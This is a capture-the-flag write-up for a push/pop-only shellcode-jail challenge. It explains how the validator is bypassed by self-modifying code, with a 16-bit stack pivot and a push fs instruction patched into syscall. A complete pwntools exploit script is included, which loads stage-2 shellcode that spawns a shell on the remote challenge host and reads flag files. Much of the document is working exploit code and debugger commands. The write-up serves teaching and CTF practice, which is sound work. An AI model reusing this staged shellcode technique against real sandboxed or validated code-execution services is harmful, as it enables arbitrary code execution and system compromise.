# Registered Stack Writeup

## Challenge Summary

We are given a 64-bit PIE ELF that:

1. Reads a line of hex from stdin
2. Converts it into raw bytes
3. Uses Capstone to validate that every decoded instruction is only `push` / `pop`
4. Requires all operands to be registers
5. `mmap`s an RWX page
6. Zeros almost all registers
7. Sets `rsp` to the start of the mapped page
8. Jumps to that page

Remote:

```bash
nc registered-stack.challs.srdnlen.it 1090
```

Final flag:

```text
srdnlen{Pu5h1n6_4nd_P0pp1n6_6av3_m3_4_h34d4ch3}
```

## Files

The provided challenge bundle contained:

```bash
ls -la
file *
```

Example result:

```text
Dockerfile
description.txt
registered_stack
```

The binary is:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

## Phase 0: Recon

### Basic checks

Commands:

```bash
file registered_stack
checksec --file=registered_stack
readelf -S registered_stack
readelf -l registered_stack
objdump -t registered_stack | grep -iE 'win|flag|shell|secret'
objdump -d registered_stack | grep -E 'system|execve'
strings -a registered_stack | grep '/bin/sh'
ROPgadget --binary registered_stack --only 'pop|ret'
strings -a registered_stack | sed -n '1,220p'
```

Important findings:

- PIE enabled
- Canary found
- NX enabled
- Full RELRO
- No `win` / `system` / `execve`
- No `/bin/sh` string
- Very sparse ROP gadgets

This immediately suggests:

- This is not a normal stack overflow challenge
- A normal ret2libc path is unlikely
- The real primitive is probably whatever the custom execution model is

### Dockerfile / libc extraction

The Dockerfile matters because it tells us the runtime libc.

Commands:

```bash
sed -n '1,220p' Dockerfile
```

It uses `ubuntu:24.04`, so I extracted the exact loader and libc:

```bash
docker run --rm -v "$PWD:/out" ubuntu:24.04 /bin/sh -lc \
  'cp /lib/x86_64-linux-gnu/libc.so.6 /out/libc.so.6 && \
   cp /lib64/ld-linux-x86-64.so.2 /out/ld-linux-x86-64.so.2'
```

Check version:

```bash
docker run --rm ubuntu:24.04 /lib/x86_64-linux-gnu/libc.so.6
```

Observed libc:

```text
Ubuntu GLIBC 2.39-0ubuntu8.7
```

Patch a local analysis copy:

```bash
pwninit --bin registered_stack --libc libc.so.6 --ld ld-linux-x86-64.so.2 --no-template
ldd ./registered_stack_patched
```

### Running the binary

If the original binary is not executable, either `chmod +x registered_stack` or use the patched copy.

Quick tests:

```bash
printf '\n' | ./registered_stack_patched
printf 'AAAA\n' | ./registered_stack_patched
printf '90\n' | ./registered_stack_patched
printf '50\n' | ./registered_stack_patched
printf '58\n' | ./registered_stack_patched
printf '50 58\n' | ./registered_stack_patched
```

Observed behavior:

- Empty input: `Failed to disassemble code`
- `90`: rejected as not `PUSH`/`POP`
- `50` or `58`: accepted, then crash

Initial conclusion:

- The binary really executes our decoded bytes
- The crash after a valid instruction means validation succeeded and execution started
- This is an asm-jail challenge, not a parser-only challenge

## Phase 0.5: Constraint and Interaction Mapping

This step matters because the wrong mental model wastes a lot of time later.

### Constraint Matrix

| Constraint | What It Blocks | What It Still Allows | What It Suggests |
|---|---|---|---|
| PIE | fixed code addresses | relative reasoning | not a static-address ROP challenge |
| Canary | direct stack smash | non-stack-control techniques | probably not intended ret overwrite |
| NX | stack shellcode | code in explicitly executable memory | use the mmap page |
| Full RELRO | GOT overwrite | read-only GOT | not a GOT-hijack pwn |
| Capstone whitelist | normal shellcode | only `push`/`pop` with register operands | staged self-modification |
| Register-only operands | no `push imm`, no `[mem]` ops | stack/register shuffling | stack-machine style execution |
| `fgets(buf, 0x200, ...)` | unlimited hex input | up to 511 chars including newline | practical max is 510 hex chars |
| `hex_to_bytes(..., max=0x100)` | >256 decoded bytes | at most 256 decoded bytes | but `fgets` makes 255 the reliable max |

### Important correction: parser confusion

An early easy mistake is thinking the parser “ignores separators”.

That is only partially true if you test superficially.

The real parsing logic is:

- it reads 2 chars at a time
- both must be hex
- if either is not hex, parsing stops immediately

So while something like `50,58` may appear to “work”, what actually happens is:

- the binary decodes the first valid pair
- then stops at the comma
- execution continues with only the already-decoded prefix

This becomes very important later when budgeting exact bytes.

Useful tests:

```bash
printf '50zz58\n' | ./registered_stack_patched
printf '0x50 0x58\n' | ./registered_stack_patched
printf '5\n' | ./registered_stack_patched
printf '6A41\n' | ./registered_stack_patched
printf 'FF30\n' | ./registered_stack_patched
printf '8F00\n' | ./registered_stack_patched
```

Interpretation:

- odd nibble counts fail
- immediate push forms fail
- memory operand push/pop forms fail

### Payload-length confusion: 255 vs 256 bytes

Two separate limits exist:

1. `hex_to_bytes` accepts up to `0x100 = 256` decoded bytes
2. `fgets(buf, 0x200, ...)` reads at most 511 input chars plus null terminator

Each decoded byte needs 2 hex chars.

So:

- 256 decoded bytes need 512 hex chars
- but `fgets(0x200)` cannot reliably take 512 data chars plus newline

Therefore the safe max is:

```text
510 hex chars = 255 decoded bytes
```

This is one of the key practical constraints of the exploit.

## Phase 1A: Static Analysis

## Function overview

List functions:

```bash
nm -an registered_stack
objdump -d registered_stack | less
```

The important non-PLT functions are:

- `main`
- `hex_to_bytes`
- `validate_code`
- `panic`
- `init`

### main

Decompile manually in Ghidra or inspect disassembly.

Core logic:

1. `mmap(NULL, 0x1000, 7, 0x21, -1, 0)`
2. `malloc(0x200)`
3. prompt user
4. `fgets`
5. `hex_to_bytes(input, mmap_page, 0x100)`
6. `validate_code(mmap_page, decoded_len)`
7. if validation passes:
   - `mov rsp, mmap_page`
   - zero `rax, rbx, rcx, rdx, rsi, rdi, r8-r15, rbp`
   - `mov fs, ax`
   - `mov gs, ax`
   - `jmp rsp`

The critical part is the transfer stub near the end of `main`.

Relevant disassembly:

```asm
mov rsp, rax
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rsi, rsi
xor rdi, rdi
xor r8, r8
xor r9, r9
xor r10, r10
xor r11, r11
xor r12, r12
xor r13, r13
xor r14, r14
xor r15, r15
xor rbp, rbp
mov fs, ax
mov gs, ax
jmp rsp
```

This means:

- code page == stack page
- registers are reset
- there are no useful inherited pointers
- any exploit must bootstrap itself from the page contents and stack effects only

### hex_to_bytes

Behavior:

- scans the input string in 2-char chunks
- both chars must be hex
- converts to one byte with `strtol(..., 16)`
- writes into the destination buffer
- stops on first invalid pair or when hitting max length

This is why exact hex budgeting matters.

### validate_code

This is the jail.

It:

1. opens Capstone in x86-64 mode
2. disassembles the whole decoded buffer
3. for every instruction:
   - instruction must be `PUSH` or `POP`
   - operands must exist
   - every operand must be a register
4. checks Capstone consumed all decoded bytes

Important consequence:

- the validator only checks the initial bytes
- it does not revalidate self-modified code

That is the core exploit idea.

### panic / init

`panic`:

- prints message to stderr
- exits

`init`:

- disables stdio buffering

## Intended exploitation model

The binary is intentionally designed as a constrained self-modifying shellcode challenge.

You start with:

- executable page
- writable page
- stack pointing into that same page
- only `push` / `pop`
- all registers zeroed

That is enough to build a staged exploit if you can:

1. seed the right values from bytes already in the page
2. use `push` / `pop` side effects to rewrite future bytes
3. turn a future instruction into `syscall`
4. invoke `read`
5. fall into unrestricted second-stage shellcode

## Phase 1B: Hypothesis Verification with pwndbg

This phase is where several important confusions got resolved.

### Start pwndbg

```bash
gdb -q ./registered_stack_patched
```

Recommended setup:

```gdb
set pagination off
set disassembly-flavor intel
b *main+0x136
run
```

`main+0x136` is the `jmp rsp` transfer point.

### Hypothesis 1: `rsp` becomes the mmap page

Send a simple valid payload:

```text
58
```

At the prompt:

```gdb
c
```

After the breakpoint:

```gdb
context regs
x/4gx $rsp
```

What you should see:

- `rsp` points to the mapped page
- the first bytes of the page contain your input bytes

This confirms:

- execution is about to begin from the mmap page
- the page is being used as the stack

### Hypothesis 2: `pop rax` reads from the page

Step into the user code:

```gdb
si
context regs
```

Then step one instruction:

```gdb
si
p/x $rax
p/x $rsp
```

For payload `58`, the result shows:

- `rax = 0x58`
- `rsp` advanced by 8

This proves:

- `pop reg` reads qwords from the page
- stack effects are the whole game

### Hypothesis 3: `push` at page base underflows

Try a payload starting with `push rsp` or `push rax`.

Example:

```bash
printf '54\n' | ./registered_stack_patched
```

You should see an immediate crash.

Reason:

- at entry, `rsp == page_base`
- `push` would first subtract 8
- that underflows below the mapped page

This is why the exploit starts with pops, not pushes.

### Hypothesis 4: `66 pop sp` only changes low 16 bits

This is one of the most important architecture-level facts in the exploit.

Manual check idea:

```gdb
run
```

Send a short test payload that reaches `66 5c`.

Then single-step and inspect `rsp`.

Expected behavior:

- high bits stay the same
- low 16 bits become the popped 16-bit value

This is what gives us an ASLR-tolerant in-page pivot:

```text
page_base = 0x....c000
pop sp with 0xc38f -> rsp = 0x....c38f
```

That is why the exploit is “bucketed”: it only works when the mmap base low 16 bits are in the `c***` range.

### Hypothesis 5: `push fs` is validator-accepted

This is the trick that becomes `syscall`.

Test:

```bash
printf '0FA0\n' | ./registered_stack_patched
```

It passes validation.

`0f a0` is `push fs`.

If we can patch the second byte:

```text
0f a0 -> 0f 05
```

then we have:

```text
syscall
```

This is the core self-modification trick.

## The Main Confusions and Their Resolutions

### Confusion 1: “Maybe separators are ignored”

Not really.

Real behavior:

- parsing stops on the first non-hex pair
- some tests seemed to “work” only because a valid decoded prefix was already enough to execute and crash

### Confusion 2: “Maybe we can use 256 bytes because `hex_to_bytes` allows it”

Statically yes, practically no.

Because:

- 256 bytes = 512 hex chars
- `fgets(0x200)` does not safely let us send 512 hex chars plus newline

So the real exploit budget is 255 bytes.

### Confusion 3: “Why not just use `rdx = rsp` for `read` length?”

This fails because `rsp` is a high ASLR address, not a small size.

`read(fd=0, buf=rsp, count=rsp)` means:

- `count` becomes enormous
- this can fail or behave badly depending on address range and kernel checks

The fix is:

- keep `rsi = rsp` because that must be the destination buffer pointer
- but use a small count in `rdx`

The working solution uses:

```text
rdx = rbx = 0xc305
```

### Confusion 4: “Why the exploit is bucketed”

Because the pivot relies on low 16 bits.

The exploit seeds:

```text
0xc38f
```

and uses `pop sp`.

This only gives a useful in-page address when the mmap page itself is in the `...c000` bucket.

That is why it only works about 1/16 of the time.

### Confusion 5: “Why does `0xc305` matter?”

Because it serves two roles:

1. after patching `8f c3` -> `05 c3`, it provides the `05` byte we need
2. it is also a small, safe `read` length to load stage 2

This is a very elegant reuse of the same seeded word.

## Phase 2: Exploit Strategy

The final strategy is:

1. Use many initial `pop` instructions to move `rsp` forward inside the page
2. Land on a seeded word `0xc38f`
3. Use `66 pop sp` to set the low 16 bits of `rsp` to `0xc38f`
4. Use `push` instructions to write controlled qwords into future code/data positions
5. Create a seeded `0xc305`
6. Use `push rsp; pop rsi` so `rsi` points to the future stage-2 buffer
7. Use `push rbx; pop rdx` style movement so `rdx = 0xc305`
8. Prepare a return target with `push rsp`
9. Place `0f a0` (`push fs`) in the future stub
10. Patch its second byte from `a0` to `05`
11. Execute the now-patched `syscall` as `read(0, rsp, 0xc305)`
12. The second-stage shellcode is read into the page
13. Return/fall through into stage 2
14. Stage 2 spawns a shell and reads the flag

This is a staged self-modifying shellcode exploit.

## Phase 3: Building the Stage-1 Payload

The working stage-1 from the solve script is:

```python
def build_stage1():
    n = 66
    code = []
    code += [0x59] * 30                # pop rcx x30 -> rsp += 0xf0
    code += [0x66, 0x5c]               # pop sp      -> 0xc38f (from [0xf0])
    code += [0x50] * 17                # push rax x17
    code += [0x66, 0x50]               # push ax      -> 0xc305
    code += [0x66, 0x54, 0x66, 0x5b]   # push sp; pop bx
    code += [0x50] * n                 # push rax x66
    code += [0x66, 0x59]               # pop cx (+2)
    code += [0x53]                     # push rbx

    L = len(code)
    S = ((0x2ff - 8 * n) & 0xfff) - 6
    m = S - L
    code += [0x59] * m

    code += [0x54, 0x5e, 0x53, 0x5a, 0x54, 0x0f, 0xa0]

    while len(code) < 0x100:
        code.append(0x59)

    code[0xf0] = 0x8f
    code[0xf1] = 0xc3

    return bytes(code)[:-1]
```

### What each part is doing

#### `pop rcx` x30

Each `pop rcx` advances `rsp` by 8.

30 pops:

```text
30 * 8 = 0xf0
```

So after these pops, the next stack read is from offset `0xf0`.

#### `66 5c` (`pop sp`)

This pops the 16-bit word at offset `0xf0`, which we seeded as:

```text
0x8f 0xc3 -> 0xc38f
```

Now:

```text
rsp.low16 = 0xc38f
```

assuming the page was in the `...c000` bucket.

#### Repeated `push rax`

Since `rax = 0`, these pushes write zeros.

This is used to prepare memory layout and future patch locations.

#### `66 50` (`push ax`)

This writes the low 16 bits of `rax`.

At the correct point in the sequence, this helps create the seeded `0xc305` value.

#### `66 54 ; 66 5b`

That is:

```asm
push sp
pop bx
```

This moves the 16-bit stack pointer low half into `bx`, giving us a small useful value in `rbx`.

#### The future stub

The stub bytes:

```text
54 5e 53 5a 54 0f a0
```

disassemble as:

```asm
push rsp
pop rsi
push rbx
pop rdx
push rsp
push fs
```

After patching `a0 -> 05`, the last instruction becomes:

```asm
syscall
```

So the final behavior is:

```asm
push rsp
pop rsi      ; rsi = stage2 buffer
push rbx
pop rdx      ; rdx = 0xc305
push rsp     ; push return target
syscall      ; read(0, rsi, rdx)
```

And because `rax = 0` and `rdi = 0` were already zeroed by `main`, the syscall is:

```text
read(0, rsi, rdx)
```

## Phase 4: Stage 2

Stage 2 is unrestricted shellcode loaded by `read`.

The solve script used:

```python
asm(shellcraft.echo('__S2__\\n') + shellcraft.amd64.linux.sh())
```

This does two things:

1. prints a marker so we know stage 1 worked
2. spawns `/bin/sh`

Then we send shell commands to read the flag.

## Manual Dynamic Analysis Commands Worth Remembering

These are the commands I would actually want in future asm-jail challenges.

### Break at transfer into user code

```gdb
gdb -q ./registered_stack_patched
set pagination off
set disassembly-flavor intel
b *main+0x136
run
```

### At the prompt, send a test payload

Examples:

```text
58
0FA0
665C
```

### Inspect page / registers

```gdb
context regs
context code
x/16bx $rsp
x/8gx $rsp
```

### Step into first-stage code

```gdb
si
si
```

### Check whether a pop read what you expect

```gdb
p/x $rax
p/x $rsp
```

### Verify page contents at seeded offsets

```gdb
x/32bx $rsp+0xf0
x/32bx $rsp+0x300
```

### Verify pivot semantics

```gdb
si
p/x $rsp
```

### Common fast checks in this challenge

```gdb
x/4i $rip
x/16bx $rip
x/8gx $rsp
```

## Final Exploit Script

The working solve script is in:

- `exploit.py`

Full script:

```python
#!/usr/bin/env python3
import os

os.environ.setdefault("XDG_CACHE_HOME", "/tmp/.cache")
os.environ.setdefault("PWNLIB_CACHE_DIR", "/tmp/.cache/pwntools")
os.environ.setdefault("TMPDIR", "/tmp")

from pwn import *
import argparse
import re
import time


context.arch = "amd64"
context.log_level = "error"

BINARY = "./registered_stack_patched"
HOST = "registered-stack.challs.srdnlen.it"
PORT = 1090


# Stage-1 for mmap low16 bucket c*** (roughly 1/16 attempts), validator-safe.
# NOTE: fgets reads at most 511 chars, so we must send <= 510 hex chars => <= 255 bytes.
def build_stage1():
    n = 66
    code = []
    code += [0x59] * 30
    code += [0x66, 0x5C]
    code += [0x50] * 17
    code += [0x66, 0x50]
    code += [0x66, 0x54, 0x66, 0x5B]
    code += [0x50] * n
    code += [0x66, 0x59]
    code += [0x53]

    length = len(code)
    stub_offset = ((0x2FF - 8 * n) & 0xFFF) - 6
    gap = stub_offset - length
    code += [0x59] * gap

    # Stub at stub_offset:
    # - rsi = rsp (read buffer pointer)
    # - rdx = rbx (small count 0xc305; avoids huge-count failure on high ASLR addresses)
    # - push rsp for trailing ret target
    # - patched push fs -> syscall
    code += [0x54, 0x5E, 0x53, 0x5A, 0x54, 0x0F, 0xA0]

    while len(code) < 0x100:
        code.append(0x59)

    # Seed for early pop sp: word 0xc38f at offset 0xf0
    code[0xF0] = 0x8F
    code[0xF1] = 0xC3

    return bytes(code)[:-1]


def build_stage2():
    return asm(shellcraft.echo("__S2__\\n") + shellcraft.amd64.linux.sh())


def connect_remote(host, port):
    return remote(host, port)


def connect_local():
    return process(BINARY, stdin=PIPE, stdout=PIPE, stderr=PIPE)


def attempt(io, stage1_hex: bytes, stage2: bytes, delay: float):
    io.recvuntil(b"Write your code > ", timeout=2)
    io.sendline(stage1_hex)

    # Avoid stdio prefetch interactions with fgets(): send raw stage-2 slightly later.
    time.sleep(delay)
    io.send(stage2)

    data = io.recv(timeout=1.0) or b""
    data += io.recv(timeout=1.0) or b""
    if b"__S2__" not in data:
        return data

    io.sendline(b"echo __READY__")
    io.sendline(
        b"cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; cat flag 2>/dev/null; "
        b"cat ./flag 2>/dev/null; cat /home/ctf/flag 2>/dev/null; cat /challenge/flag.txt 2>/dev/null"
    )
    data += io.recv(timeout=1.2) or b""
    data += io.recv(timeout=1.2) or b""
    return data


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--attempts", type=int, default=300)
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--delay", type=float, default=0.0)
    args = parser.parse_args()

    use_remote = not args.local
    stage1 = build_stage1()
    stage1_hex = stage1.hex().encode()
    stage2 = build_stage2()
    flag_re = re.compile(rb"srdnlen\{[^\n\r\}]*\}")

    for attempt_idx in range(1, args.attempts + 1):
        io = None
        try:
            io = connect_remote(args.host, args.port) if use_remote else connect_local()
            out = attempt(io, stage1_hex, stage2, args.delay)
            match = flag_re.search(out)
            if match:
                print(f"[+] attempt {attempt_idx}: {match.group(0).decode(errors='ignore')}")
                return
            if b"__READY__" in out:
                print(f"[+] attempt {attempt_idx}: shell obtained but flag not found in quick paths")
                print(out.decode(errors="ignore"))
                return
            print(f"[-] attempt {attempt_idx}: no shell ({out[:180]!r})")
        except EOFError:
            print(f"[-] attempt {attempt_idx}: EOF")
        except Exception as exc:
            print(f"[-] attempt {attempt_idx}: {exc}")
        finally:
            try:
                if io is not None:
                    io.close()
            except Exception:
                pass

    print("[-] exhausted attempts")


if __name__ == "__main__":
    main()
```

Run locally:

```bash
python3 exploit.py --local --attempts 50
```

Run remotely:

```bash
python3 exploit.py --attempts 300
```

Because the exploit is bucketed, it may need multiple attempts.

In the successful solve, remote succeeded on attempt 9.

## Why the Exploit Works

The exploit works because the validator only checks the initial decoded bytes.

After execution starts:

- the page is writable
- the page is executable
- the page is also the stack
- `push` / `pop` are enough to rewrite future bytes

So the challenge is not “get shellcode past the validator”.

The real challenge is:

```text
use validator-safe bytes to build a future non-validator-safe execution path
```

The key transition is:

```text
0f a0  ->  0f 05
push fs    syscall
```

Once you get one `syscall`, the jail is basically over because `read` lets you load unrestricted stage-2 shellcode.

## Post-Mortem / Lessons

### 1. Validate the exact parser behavior early

The “separator” misunderstanding is common and dangerous.

Always confirm:

- does parsing skip junk?
- or stop on first invalid token?

### 2. Distinguish theoretical limits from practical I/O limits

Static max:

```text
256 decoded bytes
```

Practical exploit max:

```text
255 decoded bytes
```

because of `fgets`.

### 3. In asm-jails, self-modification is often the intended path

If:

- code page is writable
- code page is executable
- validation happens only once

then self-modifying shellcode should be one of the first ideas.

### 4. Small-count syscalls matter

Using an address as a length is a classic mistake.

For `read`:

- `rsi` should be the buffer pointer
- `rdx` should be a small sane size

### 5. Architecture quirks can be the whole exploit

Here, `66 pop sp` was not a side detail.

It was the pivot primitive that made the entire exploit possible.

## Short Solve Recap

1. Reverse the binary and recognize it as a `push`/`pop` asm-jail
2. Notice validation happens only once
3. Confirm entry state:
   - page is RWX
   - `rsp = page_base`
   - registers zeroed
4. Find validator-safe `0f a0` (`push fs`)
5. Plan to patch it into `0f 05` (`syscall`)
6. Use seeded low-16-bit stack words and `pop sp` to pivot into a useful in-page location
7. Build stage 1 so it issues `read(0, rsp, 0xc305)`
8. Load unrestricted stage 2 shellcode
9. Spawn shell and read the flag
                                        
